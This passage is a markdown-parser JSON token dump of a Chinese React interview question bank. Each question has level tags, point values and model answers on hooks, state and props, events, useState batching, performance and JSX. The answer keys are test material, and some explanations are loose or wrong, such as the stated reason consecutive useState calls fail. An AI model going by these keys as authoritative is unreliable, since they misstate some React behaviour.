节点或保存可变的值。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" useRef()：用于访问组件中的 DOM 节点或保存可变的值。","text":" useRef()：用于访问组件中的 DOM 节点或保存可变的值。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** useMemo() 和 useCallback()：用于性能优化，避免不必要的渲染。","task":false,"loose":false,"text":"**1：** useMemo() 和 useCallback()：用于性能优化，避免不必要的渲染。","tokens":[{"type":"text","raw":"**1：** useMemo() 和 useCallback()：用于性能优化，避免不必要的渲染。","text":"**1：** useMemo() 和 useCallback()：用于性能优化，避免不必要的渲染。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" useMemo() 和 useCallback()：用于性能优化，避免不必要的渲染。","text":" useMemo() 和 useCallback()：用于性能优化，避免不必要的渲染。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## React 中的状态和 props 有什么区别？\\n\\n","depth":2,"text":"React 中的状态和 props 有什么区别？","tokens":[{"type":"text","raw":"React 中的状态和 props 有什么区别？","text":"React 中的状态和 props 有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：W2\\n\\n","depth":4,"text":"级别：W2","tokens":[{"type":"text","raw":"级别：W2","text":"级别：W2","escaped":false}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** props（属性）：由父组件传递给子组件，用于传递数据。props 是只读的，子组件不能修改 props。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** props（属性）：由父组件传递给子组件，用于传递数据。props 是只读的，子组件不能修改 props。","task":false,"loose":false,"text":"**1：** props（属性）：由父组件传递给子组件，用于传递数据。props 是只读的，子组件不能修改 props。","tokens":[{"type":"text","raw":"**1：** props（属性）：由父组件传递给子组件，用于传递数据。props 是只读的，子组件不能修改 props。","text":"**1：** props（属性）：由父组件传递给子组件，用于传递数据。props 是只读的，子组件不能修改 props。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" props（属性）：由父组件传递给子组件，用于传递数据。props 是只读的，子组件不能修改 props。","text":" props（属性）：由父组件传递给子组件，用于传递数据。props 是只读的，子组件不能修改 props。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n function MyComponent(props) {\\n  return <h1>{props.message}</h1>;\\n}\\n\\n```","lang":"js","text":" function MyComponent(props) {\\n  return <h1>{props.message}</h1>;\\n}\\n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** state（状态）：由组件自身管理，用于存储和跟踪组件的动态数据。state 是可变的，可以通过 this.setState()（类组件）或 useState()（函数组件）来更新。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** state（状态）：由组件自身管理，用于存储和跟踪组件的动态数据。state 是可变的，可以通过 this.setState()（类组件）或 useState()（函数组件）来更新。","task":false,"loose":false,"text":"**1：** state（状态）：由组件自身管理，用于存储和跟踪组件的动态数据。state 是可变的，可以通过 this.setState()（类组件）或 useState()（函数组件）来更新。","tokens":[{"type":"text","raw":"**1：** state（状态）：由组件自身管理，用于存储和跟踪组件的动态数据。state 是可变的，可以通过 this.setState()（类组件）或 useState()（函数组件）来更新。","text":"**1：** state（状态）：由组件自身管理，用于存储和跟踪组件的动态数据。state 是可变的，可以通过 this.setState()（类组件）或 useState()（函数组件）来更新。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" state（状态）：由组件自身管理，用于存储和跟踪组件的动态数据。state 是可变的，可以通过 this.setState()（类组件）或 useState()（函数组件）来更新。","text":" state（状态）：由组件自身管理，用于存储和跟踪组件的动态数据。state 是可变的，可以通过 this.setState()（类组件）或 useState()（函数组件）来更新。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction MyComponent() {\\n  const [count, setCount] = useState(0);\\n  return <button onClick={() => setCount(count + 1)}>{count}</button>;\\n}\\n\\n```","lang":"js","text":"function MyComponent() {\\n  const [count, setCount] = useState(0);\\n  return <button onClick={() => setCount(count + 1)}>{count}</button>;\\n}\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## React 中如何处理事件？\\n\\n","depth":2,"text":"React 中如何处理事件？","tokens":[{"type":"text","raw":"React 中如何处理事件？","text":"React 中如何处理事件？","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：W2\\n\\n","depth":4,"text":"级别：W2","tokens":[{"type":"text","raw":"级别：W2","text":"级别：W2","escaped":false}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** React 事件处理的方式与原生 JavaScript 不同，React 使用事件委托来优化性能，并且事件名称采用驼峰命名法。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** React 事件处理的方式与原生 JavaScript 不同，React 使用事件委托来优化性能，并且事件名称采用驼峰命名法。","task":false,"loose":false,"text":"**1：** React 事件处理的方式与原生 JavaScript 不同，React 使用事件委托来优化性能，并且事件名称采用驼峰命名法。","tokens":[{"type":"text","raw":"**1：** React 事件处理的方式与原生 JavaScript 不同，React 使用事件委托来优化性能，并且事件名称采用驼峰命名法。","text":"**1：** React 事件处理的方式与原生 JavaScript 不同，React 使用事件委托来优化性能，并且事件名称采用驼峰命名法。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" React 事件处理的方式与原生 JavaScript 不同，React 使用事件委托来优化性能，并且事件名称采用驼峰命名法。","text":" React 事件处理的方式与原生 JavaScript 不同，React 使用事件委托来优化性能，并且事件名称采用驼峰命名法。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction MyComponent() {\\n  const handleClick = (event) => {\\n    alert(\'Button clicked!\');\\n  };\\n\\n  return <button onClick={handleClick}>Click Me</button>;\\n}\\n\\n```","lang":"js","text":"function MyComponent() {\\n  const handleClick = (event) => {\\n    alert(\'Button clicked!\');\\n  };\\n\\n  return <button onClick={handleClick}>Click Me</button>;\\n}\\n"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** React 会自动绑定事件处理函数。\\n- **1：** 事件对象会被 React 规范化。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** React 会自动绑定事件处理函数。\\n","task":false,"loose":false,"text":"**1：** React 会自动绑定事件处理函数。","tokens":[{"type":"text","raw":"**1：** React 会自动绑定事件处理函数。","text":"**1：** React 会自动绑定事件处理函数。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" React 会自动绑定事件处理函数。","text":" React 会自动绑定事件处理函数。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 事件对象会被 React 规范化。","task":false,"loose":false,"text":"**1：** 事件对象会被 React 规范化。","tokens":[{"type":"text","raw":"**1：** 事件对象会被 React 规范化。","text":"**1：** 事件对象会被 React 规范化。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 事件对象会被 React 规范化。","text":" 事件对象会被 React 规范化。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## useState 连续调用，页面不更新？\\n\\n","depth":2,"text":"useState 连续调用，页面不更新？","tokens":[{"type":"text","raw":"useState 连续调用，页面不更新？","text":"useState 连续调用，页面不更新？","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"code","raw":"```js\\nconst [age,  setAge] = useState(42);\\n\\nfunction handleClick() {\\n  setAge(age + 1); // setAge(42 + 1)\\n  setAge(age + 1); // setAge(42 + 1)\\n  setAge(age + 1); // setAge(42 + 1)\\n}\\n\\n// 点击一次后，age 将只会变为 43 而不是 45！\\n```","lang":"js","text":"const [age,  setAge] = useState(42);\\n\\nfunction handleClick() {\\n  setAge(age + 1); // setAge(42 + 1)\\n  setAge(age + 1); // setAge(42 + 1)\\n  setAge(age + 1); // setAge(42 + 1)\\n}\\n\\n// 点击一次后，age 将只会变为 43 而不是 45！"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 连续调用 useState 不会触发页面更新，因为每次调用 useState 都会返回一个新的状态值和更新状态的函数。\\n- **1：** 要连续更新状态，你可以使用函数式更新，将当前状态作为参数传递给更新函数","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 连续调用 useState 不会触发页面更新，因为每次调用 useState 都会返回一个新的状态值和更新状态的函数。\\n","task":false,"loose":false,"text":"**1：** 连续调用 useState 不会触发页面更新，因为每次调用 useState 都会返回一个新的状态值和更新状态的函数。","tokens":[{"type":"text","raw":"**1：** 连续调用 useState 不会触发页面更新，因为每次调用 useState 都会返回一个新的状态值和更新状态的函数。","text":"**1：** 连续调用 useState 不会触发页面更新，因为每次调用 useState 都会返回一个新的状态值和更新状态的函数。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 连续调用 useState 不会触发页面更新，因为每次调用 useState 都会返回一个新的状态值和更新状态的函数。","text":" 连续调用 useState 不会触发页面更新，因为每次调用 useState 都会返回一个新的状态值和更新状态的函数。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 要连续更新状态，你可以使用函数式更新，将当前状态作为参数传递给更新函数","task":false,"loose":false,"text":"**1：** 要连续更新状态，你可以使用函数式更新，将当前状态作为参数传递给更新函数","tokens":[{"type":"text","raw":"**1：** 要连续更新状态，你可以使用函数式更新，将当前状态作为参数传递给更新函数","text":"**1：** 要连续更新状态，你可以使用函数式更新，将当前状态作为参数传递给更新函数","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 要连续更新状态，你可以使用函数式更新，将当前状态作为参数传递给更新函数","text":" 要连续更新状态，你可以使用函数式更新，将当前状态作为参数传递给更新函数","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nfunction handleClick() {\\n  setAge(a => a + 1); // setAge(42 => 43)\\n  setAge(a => a + 1); // setAge(43 => 44)\\n  setAge(a => a + 1); // setAge(44 => 45)\\n}\\n```","lang":"js","text":"function handleClick() {\\n  setAge(a => a + 1); // setAge(42 => 43)\\n  setAge(a => a + 1); // setAge(43 => 44)\\n  setAge(a => a + 1); // setAge(44 => 45)\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## React中的性能优化方法有哪些？\\n\\n","depth":2,"text":"React中的性能优化方法有哪些？","tokens":[{"type":"text","raw":"React中的性能优化方法有哪些？","text":"React中的性能优化方法有哪些？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** 使用React.memo进行组件缓存：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用React.memo进行组件缓存：","task":false,"loose":false,"text":"**1：** 使用React.memo进行组件缓存：","tokens":[{"type":"text","raw":"**1：** 使用React.memo进行组件缓存：","text":"**1：** 使用React.memo进行组件缓存：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用React.memo进行组件缓存：","text":" 使用React.memo进行组件缓存：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\nconst MyComponent = React.memo(function MyComponent(props) {\\n  /* 组件逻辑 */\\n});\\n```","lang":"jsx","text":"const MyComponent = React.memo(function MyComponent(props) {\\n  /* 组件逻辑 */\\n});"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 使用useMemo缓存计算结果：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用useMemo缓存计算结果：","task":false,"loose":false,"text":"**1：** 使用useMemo缓存计算结果：","tokens":[{"type":"text","raw":"**1：** 使用useMemo缓存计算结果：","text":"**1：** 使用useMemo缓存计算结果：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用useMemo缓存计算结果：","text":" 使用useMemo缓存计算结果：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\nconst memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);\\n```","lang":"jsx","text":"const memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 使用useCallback缓存函数：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 使用useCallback缓存函数：","task":false,"loose":false,"text":"**1：** 使用useCallback缓存函数：","tokens":[{"type":"text","raw":"**1：** 使用useCallback缓存函数：","text":"**1：** 使用useCallback缓存函数：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用useCallback缓存函数：","text":" 使用useCallback缓存函数：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\nconst memoizedCallback = useCallback(\\n  () => {\\n    doSomething(a, b);\\n  },\\n  [a, b],\\n);\\n```","lang":"jsx","text":"const memoizedCallback = useCallback(\\n  () => {\\n    doSomething(a, b);\\n  },\\n  [a, b],\\n);"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 合理使用key：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 合理使用key：","task":false,"loose":false,"text":"**1：** 合理使用key：","tokens":[{"type":"text","raw":"**1：** 合理使用key：","text":"**1：** 合理使用key：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 合理使用key：","text":" 合理使用key：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```jsx\\n{list.map(item => (\\n  <ListItem \\n    key={item.id} // 使用唯一且稳定的key\\n    data={item}\\n  />\\n))}\\n```","lang":"jsx","text":"{list.map(item => (\\n  <ListItem \\n    key={item.id} // 使用唯一且稳定的key\\n    data={item}\\n  />\\n))}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** 避免不必要的渲染：\\n  + 使用React.lazy进行代码分割\\n  + 使用虚拟列表处理长列表\\n  + 合理设计组件层级","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 避免不必要的渲染：\\n  + 使用React.lazy进行代码分割\\n  + 使用虚拟列表处理长列表\\n  + 合理设计组件层级","task":false,"loose":false,"text":"**1：** 避免不必要的渲染：\\n+ 使用React.lazy进行代码分割\\n+ 使用虚拟列表处理长列表\\n+ 合理设计组件层级","tokens":[{"type":"text","raw":"**1：** 避免不必要的渲染：\\n","text":"**1：** 避免不必要的渲染：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 避免不必要的渲染：","text":" 避免不必要的渲染：","escaped":false}]},{"type":"list","raw":"+ 使用React.lazy进行代码分割\\n+ 使用虚拟列表处理长列表\\n+ 合理设计组件层级","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用React.lazy进行代码分割\\n","task":false,"loose":false,"text":"使用React.lazy进行代码分割","tokens":[{"type":"text","raw":"使用React.lazy进行代码分割","text":"使用React.lazy进行代码分割","tokens":[{"type":"text","raw":"使用React.lazy进行代码分割","text":"使用React.lazy进行代码分割","escaped":false}]}]},{"type":"list_item","raw":"+ 使用虚拟列表处理长列表\\n","task":false,"loose":false,"text":"使用虚拟列表处理长列表","tokens":[{"type":"text","raw":"使用虚拟列表处理长列表","text":"使用虚拟列表处理长列表","tokens":[{"type":"text","raw":"使用虚拟列表处理长列表","text":"使用虚拟列表处理长列表","escaped":false}]}]},{"type":"list_item","raw":"+ 合理设计组件层级","task":false,"loose":false,"text":"合理设计组件层级","tokens":[{"type":"text","raw":"合理设计组件层级","text":"合理设计组件层级","tokens":[{"type":"text","raw":"合理设计组件层级","text":"合理设计组件层级","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是 React？它的主要特点是什么？\\n\\n","depth":2,"text":"什么是 React？它的主要特点是什么？","tokens":[{"type":"text","raw":"什么是 React？它的主要特点是什么？","text":"什么是 React？它的主要特点是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- React 是一个用于构建用户界面的 JavaScript 库，由 Facebook 开发并维护。它主要用于构建单页应用程序（SPA）和复杂的用户界面。React 的主要特点包括：\\n\\n- 组件化：React 将 UI 分解成独立的、可重用的组件。每个组件都有自己的逻辑和控制。\\n\\n- 虚拟 DOM：React 使用虚拟 DOM 来提高性能。虚拟 DOM 是一个内存中的树结构，React 会先在虚拟 DOM 中进行操作，然后批量更新真实 DOM。\\n\\n- 声明式编程：React 采用声明式编程风格，开发者只需描述 UI 应该是什么样的，React 会负责处理 UI 的变化。\\n\\n- JSX：React 使用 JSX（JavaScript XML）语法，允许在 JavaScript 中编写类似 HTML 的标记。\\n\\n- 生态系统丰富：React 拥有丰富的生态系统，包括路由器（React Router）、状态管理库（Redux、MobX）等。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- React 是一个用于构建用户界面的 JavaScript 库，由 Facebook 开发并维护。它主要用于构建单页应用程序（SPA）和复杂的用户界面。React 的主要特点包括：\\n\\n","task":false,"loose":true,"text":"React 是一个用于构建用户界面的 JavaScript 库，由 Facebook 开发并维护。它主要用于构建单页应用程序（SPA）和复杂的用户界面。React 的主要特点包括：\\n","tokens":[{"type":"text","raw":"React 是一个用于构建用户界面的 JavaScript 库，由 Facebook 开发并维护。它主要用于构建单页应用程序（SPA）和复杂的用户界面。React 的主要特点包括：\\n","text":"React 是一个用于构建用户界面的 JavaScript 库，由 Facebook 开发并维护。它主要用于构建单页应用程序（SPA）和复杂的用户界面。React 的主要特点包括：","tokens":[{"type":"text","raw":"React 是一个用于构建用户界面的 JavaScript 库，由 Facebook 开发并维护。它主要用于构建单页应用程序（SPA）和复杂的用户界面。React 的主要特点包括：","text":"React 是一个用于构建用户界面的 JavaScript 库，由 Facebook 开发并维护。它主要用于构建单页应用程序（SPA）和复杂的用户界面。React 的主要特点包括：","escaped":false}]}]},{"type":"list_item","raw":"- 组件化：React 将 UI 分解成独立的、可重用的组件。每个组件都有自己的逻辑和控制。\\n\\n","task":false,"loose":true,"text":"组件化：React 将 UI 分解成独立的、可重用的组件。每个组件都有自己的逻辑和控制。\\n","tokens":[{"type":"text","raw":"组件化：React 将 UI 分解成独立的、可重用的组件。每个组件都有自己的逻辑和控制。\\n","text":"组件化：React 将 UI 分解成独立的、可重用的组件。每个组件都有自己的逻辑和控制。","tokens":[{"type":"text","raw":"组件化：React 将 UI 分解成独立的、可重用的组件。每个组件都有自己的逻辑和控制。","text":"组件化：React 将 UI 分解成独立的、可重用的组件。每个组件都有自己的逻辑和控制。","escaped":false}]}]},{"type":"list_item","raw":"- 虚拟 DOM：React 使用虚拟 DOM 来提高性能。虚拟 DOM 是一个内存中的树结构，React 会先在虚拟 DOM 中进行操作，然后批量更新真实 DOM。\\n\\n","task":false,"loose":true,"text":"虚拟 DOM：React 使用虚拟 DOM 来提高性能。虚拟 DOM 是一个内存中的树结构，React 会先在虚拟 DOM 中进行操作，然后批量更新真实 DOM。\\n","tokens":[{"type":"text","raw":"虚拟 DOM：React 使用虚拟 DOM 来提高性能。虚拟 DOM 是一个内存中的树结构，React 会先在虚拟 DOM 中进行操作，然后批量更新真实 DOM。\\n","text":"虚拟 DOM：React 使用虚拟 DOM 来提高性能。虚拟 DOM 是一个内存中的树结构，React 会先在虚拟 DOM 中进行操作，然后批量更新真实 DOM。","tokens":[{"type":"text","raw":"虚拟 DOM：React 使用虚拟 DOM 来提高性能。虚拟 DOM 是一个内存中的树结构，React 会先在虚拟 DOM 中进行操作，然后批量更新真实 DOM。","text":"虚拟 DOM：React 使用虚拟 DOM 来提高性能。虚拟 DOM 是一个内存中的树结构，React 会先在虚拟 DOM 中进行操作，然后批量更新真实 DOM。","escaped":false}]}]},{"type":"list_item","raw":"- 声明式编程：React 采用声明式编程风格，开发者只需描述 UI 应该是什么样的，React 会负责处理 UI 的变化。\\n\\n","task":false,"loose":true,"text":"声明式编程：React 采用声明式编程风格，开发者只需描述 UI 应该是什么样的，React 会负责处理 UI 的变化。\\n","tokens":[{"type":"text","raw":"声明式编程：React 采用声明式编程风格，开发者只需描述 UI 应该是什么样的，React 会负责处理 UI 的变化。\\n","text":"声明式编程：React 采用声明式编程风格，开发者只需描述 UI 应该是什么样的，React 会负责处理 UI 的变化。","tokens":[{"type":"text","raw":"声明式编程：React 采用声明式编程风格，开发者只需描述 UI 应该是什么样的，React 会负责处理 UI 的变化。","text":"声明式编程：React 采用声明式编程风格，开发者只需描述 UI 应该是什么样的，React 会负责处理 UI 的变化。","escaped":false}]}]},{"type":"list_item","raw":"- JSX：React 使用 JSX（JavaScript XML）语法，允许在 JavaScript 中编写类似 HTML 的标记。\\n\\n","task":false,"loose":true,"text":"JSX：React 使用 JSX（JavaScript XML）语法，允许在 JavaScript 中编写类似 HTML 的标记。\\n","tokens":[{"type":"text","raw":"JSX：React 使用 JSX（JavaScript XML）语法，允许在 JavaScript 中编写类似 HTML 的标记。\\n","text":"JSX：React 使用 JSX（JavaScript XML）语法，允许在 JavaScript 中编写类似 HTML 的标记。","tokens":[{"type":"text","raw":"JSX：React 使用 JSX（JavaScript XML）语法，允许在 JavaScript 中编写类似 HTML 的标记。","text":"JSX：React 使用 JSX（JavaScript XML）语法，允许在 JavaScript 中编写类似 HTML 的标记。","escaped":false}]}]},{"type":"list_item","raw":"- 生态系统丰富：React 拥有丰富的生态系统，包括路由器（React Router）、状态管理库（Redux、MobX）等。","task":false,"loose":true,"text":"生态系统丰富：React 拥有丰富的生态系统，包括路由器（React Router）、状态管理库（Redux、MobX）等。","tokens":[{"type":"text","raw":"生态系统丰富：React 拥有丰富的生态系统，包括路由器（React Router）、状态管理库（Redux、MobX）等。","text":"生态系统丰富：React 拥有丰富的生态系统，包括路由器（React Router）、状态管理库（Redux、MobX）等。","tokens":[{"type":"text","raw":"生态系统丰富：React 拥有丰富的生态系统，包括路由器（React Router）、状态管理库（Redux、MobX）等。","text":"生态系统丰富：React 拥有丰富的生态系统，包括路由器（React Router）、状态管理库（Redux、MobX）等。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是 JSX？它有什么优点？\\n\\n","depth":2,"text":"什么是 JSX？它有什么优点？","tokens":[{"type":"text","raw":"什么是 JSX？它有什么优点？","text":"什么是 JSX？它有什么优点？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- JSX 是一种语法扩展，允许在 JavaScript 中编写类似 HTML 的标记。JSX 最终会被编译成普通的 JavaScript 代码.\\n\\n- 可读性强：JSX 使得模板代码更加直观和易读，特别是对于复杂的 UI 结构。\\n\\n- 类型检查：JSX 可以在编译时进行类型检查，减少运行时错误。\\n\\n- 表达式支持：可以在 JSX 中嵌入 JavaScript 表达式，使得动态生成 UI 变得更加方便。\\n\\n- 工具支持：现代开发工具（如 Babel）可以将 JSX 编译成兼容所有浏览器的 JavaScript 代码。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- JSX 是一种语法扩展，允许在 JavaScript 中编写类似 HTML 的标记。JSX 最终会被编译成普通的 JavaScript 代码.\\n\\n","task":false,"loose":true,"text":"JSX 是一种语法扩展，允许在 JavaScript 中编写类似 HTML 的标记。JSX 最终会被编译成普通的 JavaScript 代码.\\n","tokens":[{"type":"text","raw":"JSX 是一种语法扩展，允许在 JavaScript 中编写类似 HTML 的标记。JSX 最终会被编译成普通的 JavaScript 代码.\\n","text":"JSX 是一种语法扩展，允许在 JavaScript 中编写类似 HTML 的标记。JSX 最终会被编译成普通的 JavaScript 代码.","tokens":[{"type":"text","raw":"JSX 是一种语法扩展，允许在 JavaScript 中编写类似 HTML 的标记。JSX 最终会被编译成普通的 JavaScript 代码.","text":"JSX 